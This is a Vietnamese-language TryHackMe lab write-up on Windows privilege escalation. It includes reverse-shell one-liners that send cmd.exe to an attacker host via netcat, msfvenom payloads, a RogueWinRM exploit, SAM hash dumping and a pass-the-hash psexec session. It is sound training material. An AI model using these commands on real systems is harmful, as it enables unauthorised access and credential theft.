# Windows Privilege Escalation

**Task 1: Introduction**

Trong kiểm thử thâm nhập, có thể truy cập máy chủ Windows với tài khoản không có đặc quyền, bị hạn chế quyền truy cập và không thể thực hiện tác vụ quản trị.

Các kỹ thuật cơ bản giúp kẻ tấn công leo thang đặc quyền trong môi trường Windows, từ tài khoản thông thường lên quyền quản trị viên (nếu có thể).

**Task 2: Windows Privilege Escalation**

Leo thang đặc quyền là quá trình khai thác điểm yếu để chuyển từ "người dùng A" sang "người dùng B", thường là tài khoản quản trị. Tuy nhiên, có thể cần chuyển qua các tài khoản trung gian trước khi đạt quyền admin.

Một số phương pháp phổ biến để leo thang đặc quyền:

- Tìm thông tin xác thực trong tệp văn bản hoặc bảng tính.

- Lạm dụng cấu hình sai trong dịch vụ Windows hoặc tác vụ theo lịch.

- Khai thác đặc quyền quá mức được gán cho tài khoản hiện tại.

- Tấn công phần mềm dễ bị tổn thương hoặc bản vá bảo mật bị thiếu.

**Phân Loại Tài Khoản Windows**

Windows có hai loại tài khoản chính:

- Administrators – Toàn quyền hệ thống, có thể truy cập và thay đổi mọi thứ.

- Standard Users – Quyền hạn chế, chỉ truy cập được tệp cá nhân.

Ngoài ra, còn có một số tài khoản hệ thống đặc biệt:

- SYSTEM (LocalSystem) – Cao nhất, vượt quyền quản trị viên.

- Local Service – Chạy dịch vụ với quyền tối thiểu, sử dụng kết nối ẩn danh.

- Network Service – Chạy dịch vụ với quyền tối thiểu, xác thực qua mạng.

Những tài khoản này không thể đăng nhập trực tiếp, nhưng có thể bị khai thác để leo thang đặc quyền.

**Task 3: Harvesting Passwords from Usual Spots**

Cách dễ nhất để có quyền truy cập vào người dùng khác là thu thập thông tin xác thực từ máy bị xâm nhập.

**Cài Đặt Windows Không Cần Giám Sát**

Khi triển khai Windows hàng loạt, quản trị viên thường sử dụng **Windows Deployment Services** (WDS) để tự động cài đặt hệ điều hành mà không cần tương tác người dùng.

Trong quá trình này, thông tin tài khoản quản trị viên có thể bị lưu trữ dưới dạng văn bản rõ ràng hoặc được mã hóa yếu tại các vị trí sau:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

Khi truy cập 1 trong các vị trí này, có thể tìm thấy thông tin xác thực như sau: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image165.png?raw=true)

**Tìm Kiếm Thông Tin Đăng Nhập Trên Windows**

1. **Lịch Sử Lệnh PowerShell**

PowerShell lưu lại các lệnh đã chạy, bao gồm cả những lệnh chứa mật khẩu. Để truy xuất:

    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Trong PowerShell, thay %userprofile% bằng $Env:userprofile.

2. **Thông Tin Đăng Nhập Đã Lưu**

Windows có thể lưu thông tin xác thực của người dùng. Kiểm tra bằng:

    cmdkey /list

Dùng thông tin này để chạy lệnh với quyền cao hơn:

    runas /savecred /user:admin cmd.exe

3. **Cấu Hình IIS** (Internet Information Services)

IIS có thể lưu mật khẩu trong web.config tại:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Tìm chuỗi kết nối cơ sở dữ liệu:

    type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

4. **Lấy Thông Tin Đăng Nhập Từ PuTTY**

PuTTY lưu thông tin proxy dưới dạng văn bản rõ ràng trong registry:

    reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

=> Question: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image166.png?raw=true)

=> Lịch sử dùng lệnh

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image167.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image168.png?raw=true)

1 terminal mới mở ra: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image169.png?raw=true)

Truy cập vào Desktop của mike.katz:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image170.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image171.png?raw=true)

Đọc file flag.txt 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image172.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image173.png?raw=true)

=> tìm ra password của thom.smith user: CoolPass2021

**Task 4: Other Quick Wins**

Leo thang đặc quyền không phải lúc nào cũng là một thách thức. Một số cấu hình sai có thể cho phép có được quyền truy cập của người dùng có đặc quyền cao hơn và trong một số trường hợp, thậm chí cả quyền truy cập của quản trị viên. 

**Scheduled Tasks**

Các tác vụ đã lên lịch trên hệ thống đích, có thể thấy một tác vụ đã lập lịch bị mất tệp nhị phân hoặc nó đang sử dụng tệp nhị phân có thể sửa đổi.

Các tác vụ đã lên lịch có thể được liệt kê từ dòng lệnh bằng lệnh ***schtasks*** mà không cần bất kỳ tùy chọn nào. Để truy xuất thông tin chi tiết về bất kỳ dịch vụ nào, sử dụng lệnh như lệnh sau:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image174.png?raw=true)

Nhận được nhiều thông tin về tác vụ, nhưng điều quan trọng cần để ý là tham số "Task To Run" cho biết tác vụ nào được thực thi bởi tác vụ đã lên lịch và tham số "Run As User”, hiển thị người dùng sẽ được sử dụng để thực hiện nhiệm vụ.

Nếu người dùng hiện tại có thể sửa đổi hoặc ghi đè tệp thực thi "Task to Run", có thể kiểm soát những gì được người dùng taskusr1 thực thi, dẫn đến việc leo thang đặc quyền đơn giản.
 
Để kiểm tra quyền của tệp trên tệp thực thi, sử dụng ***icacls***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image175.png?raw=true)

=> Nhóm BUILTIN\Users có toàn quyền truy cập (F) đối với tệp nhị phân của tác vụ. Điều này có nghĩa là có thể sửa đổi tệp .bat và chèn bất kỳ tải trọng nào. Để thuận tiện, nc64.exe có thể được tìm thấy trên C:\tools. Thay đổi tệp bat để tạo ra một reverse shell:

    C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image176.png?raw=true)

=> Khởi động trình nghe trên máy tấn công trên cùng một cổng đã chỉ ra trên reverse shell:

    nc -lvp 4444

Lần tới khi scheduled task chạy, sẽ nhận được revese shell với các đặc quyền của taskusr1. Hoặc để tiết kiệm thời gian, có thể chạy tác vụ bằng lệnh sau:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image177.png?raw=true)

=> nhận được reverse shell với các đặc quyền của người dùng taskusr1:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image178.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image179.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image180.png?raw=true)

**AlwaysInstallElevated**

Leo Thang Đặc Quyền Qua Tệp Cài Đặt MSI

Tệp .msi (Windows Installer) được sử dụng để cài đặt ứng dụng trên Windows. Mặc định, chúng chạy với quyền của người dùng thực thi. 

Tuy nhiên, nếu được cấu hình với quyền cao hơn, bất kỳ tài khoản nào (kể cả không có đặc quyền) cũng có thể chạy tệp MSI với quyền quản trị. Điều này cho phép tạo một tệp MSI độc hại để leo thang đặc quyền.

Phương pháp này yêu cầu phải đặt hai giá trị đăng ký. Có thể truy vấn chúng từ dòng lệnh bằng các lệnh bên dưới:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image181.png?raw=true)

Để có thể khai thác lỗ hổng này, cần phải thiết lập cả hai. Nếu không, việc khai thác sẽ không thể thực hiện được. Nếu những điều này được đặt, có thể tạo tệp .msi độc hại bằng cách sử dụng msfvenom, như bên dưới:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

Vì đây là một reverse shell, nên chạy mô-đun Metasploit Handler được cấu hình tương ứng. Khi đã chuyển tệp đã tạo, có thể chạy trình cài đặt bằng lệnh bên dưới và nhận reverse shell: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image182.png?raw=true)

**Task 5: Abusing Service Misconfigurations - Lạm dụng cấu hình sai dịch vụ**

**Windows Services**

Các dịch vụ Windows được quản lý bởi Service Control Manager (SCM), chịu trách nhiệm:

- Quản lý trạng thái dịch vụ.
- Kiểm tra trạng thái hiện tại của dịch vụ.
- Cấu hình dịch vụ khi cần thiết.

Mỗi dịch vụ có một tệp thực thi liên quan được SCM khởi chạy khi dịch vụ bắt đầu. Tuy nhiên, các tệp này có chức năng đặc biệt để giao tiếp với SCM, vì vậy không thể chạy trực tiếp như một dịch vụ thông thường.

Ngoài ra, mỗi dịch vụ chạy dưới một tài khoản người dùng cụ thể, xác định quyền hạn của nó trong hệ thống.

Kiểm tra cấu hình dịch vụ **apphostsvc** bằng lệnh ***sc qc***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image183.png?raw=true)

Thấy rằng tệp thực thi liên quan được chỉ định thông qua tham số BINARY_PATH_NAME và tài khoản được sử dụng để chạy dịch vụ được hiển thị trên tham số SERVICE_START_NAME.

Các dịch vụ có Discretionary Access Control List (DACL), cho biết ai có quyền bắt đầu, dừng, tạm dừng, trạng thái truy vấn, cấu hình truy vấn hoặc định cấu hình lại dịch vụ, cùng với các đặc quyền khác

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image184.png?raw=true)

Tất cả các cấu hình dịch vụ được lưu trữ trên registry trong 
    
    HKLM\SYSTEM\CurrentControlSet\Services\

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image185.png?raw=true)

Một subkey tồn tại cho mọi dịch vụ trong hệ thống. Có thể thấy tệp thực thi được liên kết trên giá trị ImagePath và tài khoản được sử dụng để khởi động dịch vụ trên giá trị ObjectName. Nếu DACL đã được định cấu hình cho dịch vụ, nó sẽ được lưu trữ trong subkey có tên Security. 

**Insecure Permissions on Service Executable**

Nếu tệp thực thi được liên kết với một dịch vụ có quyền yếu cho phép kẻ tấn công sửa đổi hoặc thay thế nó, thì kẻ tấn công có thể giành được các đặc quyền của tài khoản dịch vụ

Xem xét một lỗ hổng được tìm thấy trên Bộ lập lịch hệ thống Splinterware. Để bắt đầu, truy vấn cấu hình dịch vụ bằng sc:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image186.png?raw=true)

Thấy rằng dịch vụ được cài đặt bởi phần mềm dễ bị tấn công chạy dưới dạng svcuser1 và tệp thực thi được liên kết với dịch vụ nằm trong C:\Progra~2\System~1\WService.exe

Tiến hành kiểm tra các quyền trên tệp thực thi:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image187.png?raw=true)

=> Everyone Group có quyền sửa đổi (M) đối với tệp thực thi của dịch vụ. 

=> Có thể chỉ cần ghi đè lên nó bằng bất kỳ tải trọng nào và dịch vụ sẽ thực thi nó với các đặc quyền của tài khoản người dùng đã định cấu hình.

Tạo một payload dịch vụ exe bằng cách sử dụng msfvenom và phân phối nó thông qua máy chủ web python:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image188.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image189.png?raw=true)

Pull payload từ Powershell bằng lệnh sau:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image190.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image191.png?raw=true)

Khi payload đã có trong máy chủ Windows,tiến hành thay thế tệp thực thi dịch vụ bằng payload, đồng thời cấp toàn quyền cho Everyone group để người dùng khác có thể thực thi payload: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image192.png?raw=true)

Bắt đầu trình nghe ngược trên máy tấn công:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image193.png?raw=true)

Khởi động lại dịch vụ:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image194.png?raw=true)

=> Nhận được một trình bao đảo ngược với các đặc quyền svcusr1:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image195.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image196.png?raw=true)

**Unquoted Service Paths**

Khi làm việc với các dịch vụ Windows, một hành vi rất cụ thể sẽ xảy ra khi dịch vụ được định cấu hình để trỏ đến tệp thực thi unquoted - "không được trích dẫn", nghĩa là đường dẫn của tệp thực thi liên quan không được trích dẫn chính xác để giải thích cho khoảng trắng trên lệnh.

Ví dụ:

Dịch vụ hợp lệ: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image197.png?raw=true)

Một dịch vụ khác mà không có khoảng trắng thích hợp:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image198.png?raw=true)

Vì có khoảng trắng trên tên thư mục "Disk Sorter Enterprise", lệnh trở nên mơ hồ và SCM không biết thực hiện thao tác nào sau đây:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image199.png?raw=true)

Thay vì thất bại như lẽ ra phải xảy ra, SCM cố gắng trợ giúp người dùng và bắt đầu tìm kiếm từng tệp nhị phân theo thứ tự hiển thị trong bảng:

1. Đầu tiên, tìm kiếm C:\\MyPrograms\\Disk.exe. Nếu nó tồn tại, dịch vụ sẽ chạy tệp thực thi này.

2. Nếu cái sau không tồn tại, nó sẽ tìm kiếm C:\\MyPrograms\\Disk Sorter.exe. Nếu nó tồn tại, dịch vụ sẽ chạy tệp thực thi này.

3. Nếu cái sau không tồn tại, nó sẽ tìm kiếm C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. Tùy chọn này dự kiến ​​sẽ thành công và thường sẽ được chạy trong cài đặt mặc định.

=> Nếu kẻ tấn công tạo bất kỳ tệp thực thi nào được tìm kiếm trước khi thực thi dịch vụ dự kiến, chúng có thể buộc dịch vụ chạy một tệp thực thi tùy ý.

Trong trường hợp này, các tệp nhị phân của Disk Sorter được cài đặt trong C:\MyPrograms. Theo mặc định, điều này kế thừa các quyền của thư mục C:\, cho phép bất kỳ người dùng nào tạo các tệp và thư mục trong đó. 

Kiểm tra bằng ***icacls***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image200.png?raw=true)

=> Nhóm BUILTIN\\Users có đặc quyền AD và WD, cho phép người dùng tạo các thư mục con và tệp tương ứng.

Tiếp tục tạo payload và tạo kênh lắng nghe trên máy tấn công: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image201.png?raw=true)

Tải payload trên Windows: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image202.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image203.png?raw=true)

Di chuyển payload đến bất kỳ vị trí nào có thể xảy ra việc chiếm quyền điều khiển => Chuyển payload sang C:\MyPrograms\Disk.exe. Cấp cho Mọi người toàn quyền đối với tệp để đảm bảo rằng dịch vụ có thể thực thi tệp đó:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image204.png?raw=true)

Khi dịch vụ được khởi động lại, payload sẽ thực thi:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image205.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image206.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image207.png?raw=true)

**Insecure Service Permissions**

Nếu DACL dịch vụ (không phải DACL thực thi của dịch vụ) cho phép sửa đổi cấu hình của dịch vụ thì sẽ có thể định cấu hình lại dịch vụ đó. 

Điều này sẽ cho phép trỏ tới bất kỳ tệp thực thi nào và chạy nó với bất kỳ tài khoản nào, bao gồm cả SYSTEM.

Lệnh kiểm tra dịch vụ thmservice DACL là:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image208.png?raw=true)

=> Nhóm BUILTIN\\Users có quyền SERVICE_ALL_ACCESS, nghĩa là bất kỳ người dùng nào cũng có thể cấu hình lại dịch vụ.

Trước khi thay đổi dịch vụ, xây dựng một reverse shell dịch vụ exe khác và khởi động trình nghe cho nó trên máy của kẻ tấn công:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image209.png?raw=true)

Tải trên Windows: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image210.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image211.png?raw=true)

Chuyển tệp thực thi reverse shell sang máy đích và lưu trữ nó trong C:\Users\thm-unpriv\rev-svc3.exe. Sử dụng wget để chuyển tệp thực thi và di chuyển nó đến vị trí mong muốn. Nhớ cấp quyền cho Everyone để thực thi payload:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image212.png?raw=true)

Để thay đổi tài khoản và tệp thực thi được liên kết của dịch vụ, có thể sử dụng lệnh sau (lưu ý khoảng trắng sau dấu bằng khi sử dụng sc.exe):

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image213.png?raw=true)

Có thể sử dụng bất kỳ tài khoản nào để chạy dịch vụ.Chọn LocalSystem vì đây là tài khoản có đặc quyền cao nhất hiện có. Để kích hoạt payload, tất cả những gì còn lại là khởi động lại dịch vụ

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image214.png?raw=true)

nhận lại một shell trong máy của kẻ tấn công với các đặc quyền SYSTEM:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image215.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image216.png?raw=true)

**Task 6: Abusing dangerous privileges**

**Windows Privileges**

Đặc quyền là các quyền mà tài khoản có để thực hiện các nhiệm vụ cụ thể liên quan đến hệ thống. Các tác vụ này có thể đơn giản như đặc quyền tắt máy đến đặc quyền bỏ qua một số điều khiển truy cập dựa trên DACL. 

Mỗi người dùng có một tập hợp các đặc quyền được chỉ định có thể được kiểm tra bằng lệnh sau:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image217.png?raw=true)

**SeBackup / SeRestore**

Đặc quyền SeBackup và SeRestore cho phép người dùng đọc và ghi vào bất kỳ tệp nào trong hệ thống, bỏ qua mọi DACL hiện có. 

Xem xét việc sao chép các tổ đăng ký SAM và SYSTEM để trích xuất hàm băm mật khẩu của Quản trị viên cục bộ.

Cần mở dấu nhắc lệnh bằng tùy chọn "Mở với tư cách quản trị viên" để sử dụng các đặc quyền này. Sẽ được yêu cầu nhập lại mật khẩu để có được bảng điều khiển nâng cao:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image218.png?raw=true)

Kiểm tra các đặc quyền bằng lệnh sau: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image219.png?raw=true)

Để sao lưu hàm băm SAM và SYSTEM, có thể sử dụng các lệnh sau:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image220.png?raw=true)

Bây giờ có thể sao chép các tệp này vào máy tấn công bằng SMB hoặc bất kỳ phương pháp khả dụng nào khác. Đối với SMB, có thể sử dụng smbserver.py của impacket để khởi động một máy chủ SMB đơn giản với mạng chia sẻ:

    user@attackerpc$ mkdir share
    user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share

Điều này sẽ tạo một chia sẻ có tên public trỏ đến thư mục share, yêu cầu tên người dùng và mật khẩu của phiên windows hiện tại. 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image221.png?raw=true)

Sử dụng impacket để truy xuất mật khẩu băm của người dùng:

    user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
    Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

    [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Cuối cùng có thể sử dụng hàm băm của Quản trị viên để thực hiện cuộc tấn công Pass-the-Hash và giành quyền truy cập vào máy mục tiêu với các đặc quyền SYSTEM:

    user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.250.219
    Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

    [*] Requesting shares on 10.10.175.90.....
    [*] Found writable share ADMIN$
    [*] Uploading file nfhtabqO.exe
    [*] Opening SVCManager on 10.10.175.90.....
    [*] Creating service RoLE on 10.10.175.90.....
    [*] Starting service RoLE.....
    [!] Press help for extra shell commands
    Microsoft Windows [Version 10.0.17763.1821]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32> whoami
    nt authority\system

**SeTakeOwnership**

Đặc quyền SeTakeOwnership cho phép người dùng nắm quyền sở hữu bất kỳ đối tượng nào trên hệ thống, bao gồm các tệp và khóa đăng ký, mở ra nhiều khả năng cho kẻ tấn công nâng cao đặc quyền

RUn as administrator với cmd.

kiểm tra các đặc quyền bằng lệnh sau:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image222.png?raw=true)

Lạm dụng utilman.exe để nâng cao đặc quyền. Utilman là một ứng dụng Windows tích hợp được sử dụng để cung cấp các tùy chọn Dễ truy cập trong màn hình khóa:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image223.png?raw=true)

Vì Utilman được chạy với các đặc quyền SYSTEM, nên để có được các đặc quyền SYSTEM một cách hiệu quả cần thay thế tệp nhị phân ban đầu với bất kỳ payload nào phù hợp. 

Để thay thế utilman, bắt đầu bằng cách sở hữu nó bằng lệnh sau:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image224.png?raw=true)

Lưu ý rằng việc trở thành chủ sở hữu của một tệp không nhất thiết có nghĩa là có các đặc quyền đối với tệp đó, nhưng là chủ sở hữu, có thể tự gán cho mình bất kỳ đặc quyền nào. Cấp cho người dùng toàn quyền đối với utilman.exe:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image225.png?raw=true)

Thay thế utilman.exe bằng một bản sao của cmd.exe:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image226.png?raw=true)

Kích hoạt utilman, khóa màn hình:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image227.png?raw=true)

Tiếp tục nhấp vào nút "Ease of Access", nút này chạy utilman.exe với các đặc quyền SYSTEM. Vì đã thay thế nó bằng bản sao cmd.exe nên sẽ nhận được dấu nhắc lệnh với các đặc quyền SYSTEM:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image228.png?raw=true)

**SeImpersonate / SeAssignPrimaryToken**

Hai đặc quyền này cho phép một tiến trình mạo danh người dùng khác, thực thi các tác vụ với quyền của họ. Điều này giúp các dịch vụ, như FTP Server, truy cập đúng tệp mà người dùng yêu cầu mà không cần mở quyền rộng rãi cho tài khoản dịch vụ.

Nếu một dịch vụ FTP chạy dưới tài khoản ftp không có mạo danh, nó sẽ không thể truy cập chính xác tệp của từng người dùng. Nhưng nếu có SeImpersonate hoặc SeAssignPrimaryToken, nó có thể tạm thời lấy token của người dùng đang đăng nhập để thao tác với quyền của họ.

Trong Windows, các tài khoản LOCAL SERVICE và NETWORK SERVICE thường có đặc quyền này. Kẻ tấn công có thể:

1. Tạo một tiến trình độc hại để người dùng đặc quyền kết nối.

2. Dụ người dùng có quyền cao xác thực vào tiến trình đó, từ đó giành quyền truy cập hệ thống.

Giả sử rằng đã xâm phạm một trang web chạy trên IIS và đã cài một web shell. 

sử dụng web shell để kiểm tra các đặc quyền được chỉ định của tài khoản bị xâm nhập và xác nhận rằng có cả hai đặc quyền quan tâm cho tác vụ này:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image229.png?raw=true)

RogueWinRM khai thác dịch vụ BITS (Background Intelligent Transfer Service) để thực thi lệnh với quyền SYSTEM. 

Cách thức khai thác:

1. BITS sẽ tự động kết nối đến cổng 5985 (WinRM) khi khởi động, ngay cả khi chạy dưới tài khoản không có đặc quyền.

2. WinRM (Windows Remote Management) hoạt động như SSH nhưng sử dụng PowerShell.

3. Nếu WinRM không chạy, kẻ tấn công có thể khởi động WinRM giả mạo trên cổng 5985, chặn kết nối từ BITS.

4. Nếu có SeImpersonate, kẻ tấn công có thể thực thi lệnh với quyền SYSTEM thông qua phiên kết nối này.

Trước khi chạy khai thác, khởi động trình nghe netcat để nhận reverse shell trên máy của kẻ tấn công:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image230.png?raw=true)

Sau đó, sử dụng web shell để kích hoạt hoạt động khai thác RogueWinRM bằng lệnh sau:

    c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.8.13.3 4442"

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image231.png?raw=true)

Tham số -p chỉ định tệp thực thi sẽ được chạy bằng cách khai thác, đó là nc64.exe trong trường hợp này. Tham số -a được sử dụng để truyền đối số cho tệp thực thi. Vì muốn nc64 thiết lập một reverse shell chống lại máy tấn công của nên các đối số được chuyển tới netcat sẽ là -e cmd.exe ATTACKER_IP 4442.

Nếu tất cả đã được thiết lập chính xác, một shell có các đặc quyền SYSTEM:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image232.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image233.png?raw=true)

**Task 7: Abusing vulnerable software**

**Unpatched Software**

Phần mềm cũ hoặc không được cập nhật có thể tạo ra cơ hội leo thang đặc quyền. Đặc biệt, các trình điều khiển thường bị bỏ qua trong quá trình cập nhật.

Liệt kê phần mềm đã cài đặt
Sử dụng wmic để kiểm tra danh sách phần mềm và phiên bản:

    wmic product get name,version,vendor

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image234.png?raw=true)

Lưu ý: Lệnh này có thể mất một phút để hoàn tất và có thể không hiển thị đầy đủ tất cả phần mềm.

Kiểm tra thêm dấu hiệu phần mềm tiềm năng

- Lối tắt trên màn hình
- Dịch vụ đang chạy
- Thư mục cài đặt phổ biến

**Case Study: Druva inSync 6.6.3**

Lỗ hổng leo thang đặc quyền

